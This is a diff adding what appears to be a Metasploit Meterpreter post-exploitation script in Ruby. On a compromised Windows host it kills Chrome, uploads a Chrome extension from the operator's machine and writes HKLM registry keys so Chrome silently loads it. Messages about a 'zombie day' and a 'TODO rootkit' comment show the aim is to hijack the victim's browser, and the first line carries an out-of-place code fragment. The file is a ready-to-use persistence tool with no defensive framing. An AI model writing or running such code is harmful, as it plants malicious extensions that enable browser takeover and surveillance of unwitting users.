@@ -1,0 +1,65 @@
+﻿print_status "Script starting, this.SleepEx(5000); // simulate work"
+sleep 1
+begin
+if client.sys.config.sysinfo["OS"] =~ /Windows/
+	print_status "Windows found"
+	plist = client.sys.process.get_processes()
+	begin
+		plist.each do |x|
+			if ("chrome.exe" == x['name'])
+				client.sys.process.kill(x['pid'])
+				print_good "Chrome process killed."
+			end
+		end
+	rescue
+		print_status ""
+	end
+	homepath = client.fs.file.expand_path("%HOMEPATH%")
+	begin
+		err = client.fs.file.upload(homepath,"/media/sf_Pentest/flash_playerX/svn/trunk/chrome.crx")  # change this to the location of the chrome extension
+		print_status "Uploading extension, cross fingers ..."
+	rescue
+		print_error("Upload error")
+		return
+	end
+	#print_error "TODO rootkit"
+	key = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Google\\Chrome\\Extensions\\hhmdhapnoibganohhpfafpikfmbbpflk'  # change the extension id to the current id
+	root_key, base_key = client.sys.registry.splitkey(key)
+
+	value = "path"
+	data = "C:" + homepath + "\\chrome.crx"		# change the extension name
+	type = "REG_SZ"
+	print_status "Writing to registry"
+	open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE)
+	open_key.set_value(value, client.sys.registry.type2str(type), data)
+	
+	value = "version"
+	data = "1.0"
+	type = "REG_SZ"
+	open_key.set_value(value, client.sys.registry.type2str(type), data)	
+	print_good "Chrome extension successfully uploaded, have a nice zombie day."
+	print_good "                               ......		  "          
+	print_good "                               C C  /            "
+	print_good "                              /<   /             "
+	print_good "               ___ __________/_#__=o             "
+	print_good "              /(- /(\\_\\________   \\              "
+	print_good "              \\ ) \\ )_      \\o     \\             "
+	print_good "              /|\\ /|\\       |'     |             "
+	print_good "                            |     _|             "
+	print_good "                            /o   __\\             "
+	print_good "                           / '     |             "
+	print_good "                          / /      |             "
+	print_good "                         /_/\\______|             "
+	print_good "                        (   _(    <              "
+	print_good "                         \\    \\    \\             "
+	print_good "                          \\    \\    |            "
+	print_good "                           \\____\\____\\           "
+	print_good "                           ____\\_\\__\\_\\          "
+	print_good "                         /`   /`     o\\          "
+	print_good "                         |___ |_______|"
+	return
+end
+rescue
+	print_error "Unknown error happened"
+	return
+end
